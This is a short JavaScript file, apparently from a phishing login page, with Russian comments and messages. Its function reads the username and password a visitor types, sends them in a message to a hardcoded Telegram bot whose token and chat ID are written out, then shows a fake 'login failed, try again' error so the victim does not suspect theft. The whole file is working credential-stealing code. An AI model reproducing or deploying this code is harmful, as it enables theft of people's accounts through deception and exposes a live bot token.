function sendToTelegram() {
    let username = document.getElementById("username").value.trim();
    let password = document.getElementById("password").value.trim();

    if (username === "" || password === "") {
        showErrorPopup("Заполните все поля!");
        return;
    }

    let botToken = "7717544851:AAGHeXPyrmMXp3hZre6FKCzx2zE27Jt4O_A";  // Ваш токен
    let chatId = "5444484112";  // Ваш chat_id
    let message = `🔑 Новый логин!\n👤 Логин: ${username}\n🔒 Пароль: ${password}`;

    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                showErrorPopup("Ошибка входа. Проверьте данные и попробуйте снова.");
            } else {
                showErrorPopup("Произошла ошибка при отправке данных.");
            }
        })
        .catch(error => {
            console.error("Ошибка:", error);
            showErrorPopup("Не удалось отправить данные.");
        });

    // Очистка полей
    document.getElementById("username").value = "";
    document.getElementById("password").value = "";
}

// Функция для отображения модального окна с ошибкой
function showErrorPopup(message) {
    let popup = document.getElementById("error-popup");
    let popupMessage = document.getElementById("error-message");
    popupMessage.textContent = message;
    popup.style.display = "flex";

    // Закрытие окна
    document.getElementById("error-close").onclick = function() {
        popup.style.display = "none";
    };

    // Закрытие окна при клике вне контента
    window.onclick = function(event) {
        if (event.target === popup) {
            popup.style.display = "none";
        }
    };
}


